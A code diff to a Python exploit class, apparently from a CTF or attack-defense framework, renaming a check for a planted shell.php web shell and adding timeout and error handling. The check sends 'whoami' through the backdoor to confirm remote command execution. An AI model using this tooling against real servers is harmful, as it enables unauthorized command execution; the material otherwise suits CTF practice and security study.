@@ -9,7 +9,7 @@ COLOR_ORANGE = '\033[93m'
 COLOR_FAIL = '\033[91m'
 COLOR_END = '\033[0m'
 
-class ChallengeTwoShellPHP(Exploit):
+class BackdoorTwoShellPHP(Exploit):
 	"""
 	WARNING: PHP is dumb and won't let you run a process in the background like you expect, so you need to pipe the output to a file https://stackoverflow.com/questions/14555971/php-exec-background-process-issues
 	WARNING: It's a bit tricky to tell if our commands were successful because `shell.php` does not return error codes or stderr, make sure to add 'echo $?' or something similar to the end of the command.
@@ -34,13 +34,19 @@ class ChallengeTwoShellPHP(Exploit):
 		Returns True if vulnerable and False if not
 		"""
 		try:
-			logger.info("Testing if the target is vulnerable to ChallengeTwoShellPHP...")
+			logger.info("Testing if the target is vulnerable to BackdoorTwoShellPHP...")
 			command = "whoami"
 			server_output = self.run_custom_command(command=command)
 			if "www-data" in server_output:
-				logger.info(f"{COLOR_OKGREEN}The target is vulnerable to ChallengeTwoShellPHP!{COLOR_END}")
+				logger.info(f"{COLOR_OKGREEN}The target is vulnerable to BackdoorTwoShellPHP!{COLOR_END}")
 				return True
 			raise PatchedException()
 		except PatchedException:
-			logger.info(f"{COLOR_FAIL}The target is not vulnerable to ChallengeTwoShellPHP.{COLOR_END}")
+			logger.info(f"{COLOR_FAIL}The target is not vulnerable to BackdoorTwoShellPHP.{COLOR_END}")
+			return False
+		except requests.ConnectTimeout:
+			logger.info(f"{COLOR_ORANGE}The request timed out while checking if BackdoorTwoShellPHP is vulnerable.{COLOR_END}")
+			return False
+		except Exception:
+			logger.info(f"{COLOR_ORANGE}Something went wrong while checking if BackdoorTwoShellPHP is vulnerable.{COLOR_END}")
 			return False
